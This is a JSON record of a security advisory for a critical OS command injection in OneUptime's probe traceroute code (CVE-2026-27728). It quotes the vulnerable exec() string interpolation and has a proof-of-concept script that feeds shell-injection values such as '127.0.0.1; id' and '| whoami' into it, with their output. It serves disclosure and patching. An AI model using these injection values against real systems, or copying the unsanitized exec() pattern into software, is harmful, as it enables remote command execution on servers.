{
  "Severity": "CRITICAL",
  "UpdatedAt": "2026-02-25T18:09:49Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "@oneuptime/common"
  },
  "Advisory": {
    "DatabaseId": 339242,
    "Id": "GSA_kwCzR0hTQS1qbWhwLTU1NTgtcXhoNc4ABS0q",
    "GhsaId": "GHSA-jmhp-5558-qxh5",
    "References": [
      {
        "Url": "https://github.com/OneUptime/oneuptime/security/advisories/GHSA-jmhp-5558-qxh5"
      },
      {
        "Url": "https://github.com/OneUptime/oneuptime/commit/f2cce35a04fac756cecc7a4c55e23758b99288c1"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27728"
      },
      {
        "Url": "https://github.com/advisories/GHSA-jmhp-5558-qxh5"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-jmhp-5558-qxh5"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2026-27728"
      }
    ],
    "Description": "## Summary\n\nAn OS command injection vulnerability in `NetworkPathMonitor.performTraceroute()` allows any authenticated project user to execute arbitrary operating system commands on the Probe server by injecting shell metacharacters into a monitor's destination field.\n\n## Details\n\nThe vulnerability exists in [`Probe/Utils/Monitors/MonitorTypes/NetworkPathMonitor.ts`](Probe/Utils/Monitors/MonitorTypes/NetworkPathMonitor.ts), lines 149–191.\n\nThe `performTraceroute()` method constructs a shell command by directly interpolating the user-controlled `destination` parameter into a string template, then executes it via `child_process.exec()` (wrapped through `promisify`):\n\n```typescript\n// Line 13 — exec imported from child_process\nimport { exec } from \"child_process\";\n\n// Line 15-17 — promisified into execAsync\nconst execAsync = promisify(exec);\n\n// Lines 149-191 — destination is never sanitized\nprivate static async performTraceroute(\n    destination: string,  // ← attacker-controlled\n    maxHops: number,\n    timeout: number,\n): Promise\u003cTraceRoute\u003e {\n    // ...\n    let command: string;\n    if (isWindows) {\n        command = `tracert -h ${maxHops} -w ${...} ${destination}`;\n    } else if (isMac) {\n        command = `traceroute -m ${maxHops} -w 3 ${destination}`;\n    } else {\n        command = `traceroute -m ${maxHops} -w 3 ${destination}`;\n    }\n\n    const tracePromise = execAsync(command);  // ← shell execution\n```\n\nThe `destination` value originates from the public `trace()` method (line 31), which accepts `URL | Hostname | IPv4 | IPv6 | string` types. When a raw `string` is passed (line 47: `hostAddress = destination`), no validation or sanitization is performed before it reaches `performTraceroute()`.\n\n`child_process.exec()` spawns a shell (`/bin/sh`), so any shell metacharacters (`;`, `|`, `$()`, `` ` ` ``, `\u0026\u0026`, `||`, `\\n`) in `destination` will be interpreted, allowing full command injection.\n\n## PoC\n\n\n1. poc.cjs\n```javascript\n/**\n * PoC: OS Command Injection in OneUptime NetworkPathMonitor\n *\n * Replicates the exact vulnerable code path from\n * Probe/Utils/Monitors/MonitorTypes/NetworkPathMonitor.ts:149-191\n */\n\nconst { exec } = require(\"child_process\");\nconst { promisify } = require(\"util\");\nconst execAsync = promisify(exec);\n\nasync function performTraceroute_VULNERABLE(destination, maxHops, timeout) {\n    const isMac = process.platform === \"darwin\";\n    const isWindows = process.platform === \"win32\";\n\n    let command;\n    if (isWindows) {\n        command = `tracert -h ${maxHops} -w ${Math.ceil(timeout / 1000) * 1000} ${destination}`;\n    } else if (isMac) {\n        command = `traceroute -m ${maxHops} -w 3 ${destination}`;\n    } else {\n        command = `traceroute -m ${maxHops} -w 3 ${destination}`;\n    }\n\n    console.log(`[VULN] Constructed command: ${command}`);\n\n    try {\n        const { stdout, stderr } = await execAsync(command);\n        return { stdout, stderr };\n    } catch (err) {\n        return { stdout: err.stdout || \"\", stderr: err.stderr || err.message };\n    }\n}\n\nasync function runPoC() {\n    console.log(\"=== Payload 1: Semicolon chaining (;) ===\");\n    console.log(\"  destination = '127.0.0.1; id'\\n\");\n    const r1 = await performTraceroute_VULNERABLE(\"127.0.0.1; id\", 1, 5000);\n    console.log(\"[stdout]:\", r1.stdout);\n\n    console.log(\"\\n=== Payload 2: Pipe injection (|) ===\");\n    console.log(\"  destination = '127.0.0.1 | whoami'\\n\");\n    const r2 = await performTraceroute_VULNERABLE(\"127.0.0.1 | whoami\", 1, 5000);\n    console.log(\"[stdout]:\", r2.stdout);\n\n    console.log(\"\\n=== Payload 3: Subshell execution $() ===\");\n    console.log(\"  destination = '127.0.0.1$(echo INJECTED)'\\n\");\n    const r3 = await performTraceroute_VULNERABLE(\"127.0.0.1$(echo INJECTED)\", 1, 5000);\n    console.log(\"[stderr]:\", r3.stderr);\n}\n\nrunPoC().catch(console.error);\n```\n\n2. Run the PoC:\n\n```bash\nnode poc.cjs\n```\n\n3. **Expected output** (confirmed on macOS with Node.js v25.2.1):\n\n```\n=== Payload 1: Semicolon chaining (;) ===\n  destination = '127.0.0.1; id'\n\n[VULN] Constructed command: traceroute -m 1 -w 3 127.0.0.1; id\n[stdout]:  1  localhost (127.0.0.1)  0.215 ms  0.076 ms  0.055 ms\nuid=501(dxleryt) gid=20(staff) groups=20(staff),12(everyone)...\n\n=== Payload 2: Pipe injection (|) ===\n  destination = '127.0.0.1 | whoami'\n\n[VULN] Constructed command: traceroute -m 1 -w 3 127.0.0.1 | whoami\n[stdout]: dxleryt\n\n=== Payload 3: Subshell execution $() ===\n  destination = '127.0.0.1$(echo INJECTED)'\n\n[VULN] Constructed command: traceroute -m 1 -w 3 127.0.0.1$(echo INJECTED)\n[stderr]: traceroute: unknown host 127.0.0.1INJECTED\n```\n\nThe `id` and `whoami` commands execute successfully, proving arbitrary command execution. The subshell payload proves inline shell evaluation — `$(echo INJECTED)` is evaluated and appended to the hostname.\n\n## Impact\n\n**Vulnerability type:** OS Command Injection (CWE-78)\n\n**Who is impacted:** Any authenticated user with the ability to create or edit a network path monitor in a OneUptime project can execute arbitrary operating system commands on the Probe server(s). In a multi-tenant SaaS deployment, this allows a malicious tenant to:\n\n- **Execute arbitrary commands** as the Probe service user (Remote Code Execution)\n- **Read sensitive files** from the Probe server (e.g., environment variables, credentials, service account tokens)\n- **Pivot to internal services** accessible from the Probe's network position\n- **Compromise other tenants' monitoring data** if Probes are shared across tenants\n- **Establish persistent backdoors** (reverse shells, cron jobs, SSH keys)\n\n\u003e **Note:** The `NetworkPathMonitor` class is fully implemented and exported but not yet wired into the monitor execution pipeline (no callers import it). The vulnerability will become exploitable once this monitor type is integrated. The code is present in the current codebase and ready to be activated.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2026-02-25T18:09:47Z",
    "Severity": "CRITICAL",
    "Summary": "OneUptime: OS Command Injection in Probe NetworkPathMonitor via unsanitized destination in traceroute exec()",
    "UpdatedAt": "2026-02-27T20:55:32Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 10,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "10.0.7"
      },
      "VulnerableVersionRange": "\u003c 10.0.7"
    }
  ]
}